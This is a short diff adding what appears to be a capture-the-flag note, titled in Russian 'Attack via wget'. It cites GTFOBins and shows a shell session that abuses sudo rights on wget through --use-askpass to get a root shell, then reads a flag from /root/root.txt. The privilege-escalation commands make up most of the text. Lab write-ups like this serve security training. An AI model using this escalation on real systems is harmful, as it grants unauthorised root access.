@@ -1,0 +1,11 @@
+Атака через wget
+https://gtfobins.github.io/gtfobins/wget/#shell
+
+regular@747b6c932992:~$ TF=$(mktemp)
+regular@747b6c932992:~$ chmod +x $TF
+regular@747b6c932992:~$ echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
+regular@747b6c932992:~$ sudo wget --use-askpass=$TF 0
+# ls
+# cat /root/root.txt
+Flag is: 612bf918827518347255bc3caf1625cf
+# 
